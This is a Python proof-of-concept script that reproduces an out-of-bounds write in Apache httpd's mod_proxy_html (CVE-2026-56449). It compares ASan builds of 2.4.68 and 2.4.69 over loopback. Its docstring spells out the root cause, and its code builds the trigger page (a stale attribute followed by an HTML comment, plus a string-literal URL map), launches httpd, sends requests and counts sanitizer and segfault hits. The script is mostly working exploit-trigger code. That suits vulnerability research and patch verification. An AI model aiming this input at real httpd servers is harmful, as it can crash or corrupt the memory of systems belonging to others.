#!/usr/bin/env python3
"""Adjacent lane L5: CVE-2026-56449 mod_proxy_html dump_content OOB write.

Loopback-only differential on locally built ASan/UBSan httpd.
2.4.68 calls dump_content(ctx) from pcomment(); 2.4.69 removed that call.

Causal hypothesis: pstartElement leaves ctx->vb.strlen = 0 while the
buffer still holds the last attribute value (mod_proxy_html.c:617 in
2.4.68).  A following comment invokes dump_content() in the !extfix
branch; a string-literal map with the c (M_CDATA) flag then finds the
stale text with strstr(), but len == 0, so
    memmove(buf + match + s_to, buf + match + s_from,
            len + 1 - s_from - match)
underflows its size_t and performs a huge write.

Env controls:
  L5_FROM / L5_TO       string-literal map pair (default AAAA / BBBB)
  L5_ATTR               attribute value left stale in vb (default AAAAAAAAAA)
  L5_BODY               overriding full HTML body
  L5_EXT=yes|on         set ProxyHTMLExtended On (control: the fix path)
  L5_N=<int>            requests per build (default 8)
  L5_SUFFIX             log/conf tag

Usage:
  ./l5-lane.py 2.4.68 2.4.69
"""
import os
import signal
import socket
import subprocess
import sys
import time
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

BASE = "/home/mesh-home/mishe-tauftauf2shell/lab/apache2shell"
RUN = os.path.join(BASE, "run")
LOGS = os.path.join(BASE, "logs")
ROOT = os.path.join(BASE, "l5")
FROM = os.environ.get("L5_FROM", "AAAA")
TO = os.environ.get("L5_TO", "BBBB")
ATTR = os.environ.get("L5_ATTR", "AAAAAAAAAA")
BODY = os.environ.get("L5_BODY", "")
EXT = "On" if os.environ.get("L5_EXT", "").lower() in ("1", "yes", "on") else "Off"
NREQ = int(os.environ.get("L5_N", "8"))
SUFFIX = os.environ.get("L5_SUFFIX", "default")
FLAGS = os.environ.get("L5_FLAGS", "")
PROXY = os.environ.get("L5_PROXY", "").lower() in ("1", "yes", "on")
BACKEND = int(os.environ.get("L5_BACKEND", "7292"))
DOCROOT = os.path.join(ROOT, "docroot-" + SUFFIX)


def conf_for(version, port):
    install = os.path.join(ROOT, "install-%s-asan" % version)
    if PROXY:
        return """ServerRoot "{install}"
PidFile "{pid}"
Listen 127.0.0.1:{port}
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule authz_host_module modules/mod_authz_host.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule mime_module modules/mod_mime.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so
LoadModule proxy_html_module modules/mod_proxy_html.so
ServerName localhost
ErrorLog "{err}"
LogLevel info proxy_html:trace1
ProxyHTMLEnable On
ProxyHTMLLinks a href
ProxyHTMLExtended {ext}
ProxyHTMLURLMap {mapfrom} {mapto} {flags}
<Proxy "*">
    Require all granted
</Proxy>
ProxyPass / http://127.0.0.1:{backend}/
""".format(install=install,
           pid=os.path.join(RUN, "l5-%s-%s.pid" % (version, SUFFIX)),
           port=port, backend=BACKEND,
           err=os.path.join(LOGS, "l5-%s-%s-error.log" % (version, SUFFIX)),
           ext=EXT, mapfrom=FROM, mapto=TO, flags=FLAGS)
    return """ServerRoot "{install}"
PidFile "{pid}"
Listen 127.0.0.1:{port}
LoadModule authn_core_module modules/mod_authn_core.so
LoadModule authz_core_module modules/mod_authz_core.so
LoadModule authz_host_module modules/mod_authz_host.so
LoadModule unixd_module modules/mod_unixd.so
LoadModule mime_module modules/mod_mime.so
LoadModule log_config_module modules/mod_log_config.so
LoadModule env_module modules/mod_env.so
LoadModule proxy_html_module modules/mod_proxy_html.so
ServerName localhost
ErrorLog "{err}"
LogLevel info proxy_html:trace8
DocumentRoot "{docroot}"
<Directory "{docroot}">
    Require all granted
    SetEnv PROXY_HTML_FORCE 1
    SetOutputFilter proxy-html
    ProxyHTMLEnable On
    ProxyHTMLLinks a href
    ProxyHTMLExtended {ext}
    ProxyHTMLURLMap {mapfrom} {mapto} {flags}
</Directory>
""".format(install=install,
           pid=os.path.join(RUN, "l5-%s-%s.pid" % (version, SUFFIX)),
           port=port,
           err=os.path.join(LOGS, "l5-%s-%s-error.log" % (version, SUFFIX)),
           docroot=DOCROOT, ext=EXT, mapfrom=FROM, mapto=TO, flags=FLAGS)


def stop(pidfile):
    if not os.path.exists(pidfile):
        return
    for line in open(pidfile):
        try:
            os.kill(int(line.strip()), signal.SIGTERM)
        except ProcessLookupError:
            pass
    for _ in range(30):
        if not os.path.exists(pidfile):
            break
        time.sleep(0.1)


def request(port):
    s = socket.create_connection(("127.0.0.1", port), timeout=5)
    s.sendall(("GET /index.html HTTP/1.1\r\nHost: localhost\r\n"
               "Connection: close\r\n\r\n").encode())
    data = b""
    while True:
        b = s.recv(65536)
        if not b:
            break
        data += b
    s.close()
    return data


def probe(version, port):
    os.makedirs(DOCROOT, exist_ok=True)
    body = BODY or ('<p title="%s">x</p><!--trigger-->' % ATTR)
    open(os.path.join(DOCROOT, "index.html"), "w").write(body)
    backend = None
    if PROXY:
        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                payload = body.encode()
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.send_header("Content-Length", str(len(payload)))
                self.end_headers()
                self.wfile.write(payload)

            def log_message(self, *args):
                pass

        backend = ThreadingHTTPServer(("127.0.0.1", BACKEND), Handler)
        threading.Thread(target=backend.serve_forever, daemon=True).start()
    err = os.path.join(LOGS, "l5-%s-%s-error.log" % (version, SUFFIX))
    conf = os.path.join(RUN, "l5-%s-%s.conf" % (version, SUFFIX))
    pidf = os.path.join(RUN, "l5-%s-%s.pid" % (version, SUFFIX))
    open(conf, "w").write(conf_for(version, port))
    if os.path.exists(err):
        os.unlink(err)
    stop(pidf)
    httpd = os.path.join(ROOT, "install-%s-asan" % version, "bin", "httpd")
    srv = subprocess.Popen([httpd, "-f", conf],
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    time.sleep(1.5)
    statuses = []
    for _ in range(NREQ):
        try:
            r = request(port)
            statuses.append(r.split(b"\r\n", 1)[0].decode(errors="replace"))
        except Exception as e:
            statuses.append("ERR:%s" % e)
    stop(pidf)
    try:
        srv.wait(timeout=10)
    except subprocess.TimeoutExpired:
        srv.kill()
        srv.wait()
    out = srv.stdout.read().decode(errors="replace")
    if backend is not None:
        backend.shutdown()
        backend.server_close()
    log = open(err, errors="replace").read() if os.path.exists(err) else ""
    hay = log + out
    print("=== %s port %d suffix=%s ext=%s map=%s->%s ===" % (
        version, port, SUFFIX, EXT, FROM, TO))
    print("body:", body)
    print("statuses:", statuses[:4], "...")
    print("child SEGV:", log.count("exit signal Segmentation fault"),
          "srv rc:", srv.returncode)
    for needle in ("AddressSanitizer", "heap-buffer-overflow",
                   "stack-buffer-overflow", "runtime error", "SEGV",
                   "dump_content", "mod_proxy_html"):
        print("  %-22s : %d" % (needle, hay.count(needle)))
    return hay


if __name__ == "__main__":
    versions = sys.argv[1:] or ["2.4.68", "2.4.69"]
    ports = {"2.4.68": 7280, "2.4.69": 7281}
    for v in versions:
        hay = probe(v, ports[v])
        tag = os.path.join(LOGS, "l5-smoke-%s-%s.txt" % (v, SUFFIX))
        open(tag, "w").write(hay)
        print("saved ->", tag)
